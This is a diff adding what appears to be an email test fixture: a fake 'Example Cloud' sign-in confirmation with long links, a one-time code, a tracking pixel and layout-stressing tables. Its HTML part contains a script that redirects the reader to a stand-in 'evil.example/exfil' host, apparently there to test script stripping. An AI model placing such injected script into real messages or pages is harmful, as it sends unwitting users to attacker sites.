@@ -1,0 +1,57 @@
+From: "Example Cloud Security" <no-reply@cloud.example>
+To: github-x9f2@demo.example
+Subject: New sign-in to Example Cloud — confirm your device
+Message-ID: <stress-1@cloud.example>
+Date: Fri, 19 Sep 2026 15:04:11 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="ALT-STRESS"
+
+--ALT-STRESS
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hi,
+
+We received a sign-in to Example Cloud from a device we do not recognise. If
+this was you, confirm it with the link below. The link works once and expires
+in 10 minutes.
+
+https://console.cloud.example/verify?intent=device&token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJVNT
+hTTEoiLCJleHAiOjE3OTAwMDAwMDAwfQ&sig=MEUCIQDT%2B7kc0V3nKqZ8&next=%2Fsettings%2Fsecurity
+
+You can also paste this address, as it appeared in the message:
+https://59.email.cloud.example/CL0/https:%2F%2Fconsole.cloud.example%2Fverify%3Fintent%3Ddevice%26token%3Dshort%26sig%3DMEUCIQDT/1/010101a0ba5a30a0-8dc5e2f4-35ab-4aba-b73e-0c54cbee1234
+
+Your one-time code is 441702
+
+Summary of this sign-in:
+  device     Chrome 129 on macOS 15.6
+  ip         203.0.113.24
+  time       2026-09-19 15:04:11 UTC
+  location   Hanoi, VN
+
+--
+Example Cloud Security
+Never share this code with anyone, including support.
+
+--ALT-STRESS
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">
+<p>A new sign-in reached Example Cloud.</p>
+<p><a href="https://console.cloud.example/verify?intent=device&amp;token=short&amp;sig=MEUCIQDT">Confirm your device</a></p>
+<p>Not you? <a href="https://account.cloud.example/password/reset?next=%2Fsettings">reset your password</a>.</p>
+<table width="700" cellpadding="6"><tr>
+  <td width="300">Session reference (long, must not widen the page)</td>
+  <td width="400">https://session.cloud.example/d/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef</td>
+</tr><tr>
+  <td>Device</td><td>Chrome 129 on macOS 15.6</td>
+</tr></table>
+<p>Details: <a href="https://docs.cloud.example/handbook/security/investigating-an-unrecognised-sign-in-from-a-device-you-do-not-recognise-see-this-long-reference-page-for-what-happens-next">what happens after you confirm</a></p>
+<img src="https://track.cloud.example/open?id=9988" width="1" height="1" alt="">
+<script>document.location="https://evil.example/exfil"</script>
+</td></tr></table>
+</body></html>
+
+--ALT-STRESS--
